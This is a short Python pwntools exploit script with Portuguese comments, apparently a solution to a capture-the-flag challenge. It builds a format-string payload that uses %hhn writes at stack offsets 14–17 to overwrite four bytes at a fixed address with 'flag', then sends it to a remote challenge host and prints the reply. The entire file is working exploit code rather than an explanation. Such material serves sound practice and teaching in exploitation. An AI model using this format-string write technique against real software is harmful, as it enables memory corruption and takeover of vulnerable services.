from pwn import *

context.log_level = 'info'

sus_addr = 0x404048

# 1. Coloca os 4 endereços alvo no início do payload (ocupam exatamente 32 bytes)
payload = p64(sus_addr)       # Offset 14
payload += p64(sus_addr + 1)  # Offset 15
payload += p64(sus_addr + 2)  # Offset 16
payload += p64(sus_addr + 3)  # Offset 17

# 2. Adiciona os formatadores para escrever os bytes incrementais (contando com os 32 bytes iniciais)
# Ordem por valor alvo para escrita incremental: 97 -> 102 -> 103 -> 108
payload += b"%65c%16$hhn"  # Total: 32 + 65 = 97 (0x61) em sus_addr + 2 (Offset 16)
payload += b"%5c%14$hhn"   # Total: 97 + 5 = 102 (0x66) em sus_addr (Offset 14)
payload += b"%1c%17$hhn"   # Total: 102 + 1 = 103 (0x67) em sus_addr + 3 (Offset 17)
payload += b"%5c%15$hhn"   # Total: 103 + 5 = 108 (0x6c) em sus_addr + 1 (Offset 15)

io = remote('chatelaine.cylabacademy.net', 23933)
io.sendlineafter(b"What do you have to say?\n", payload)

print("--- RESPOSTA DO SERVIDOR ---")
print(io.recvall().decode(errors='ignore'))
io.close()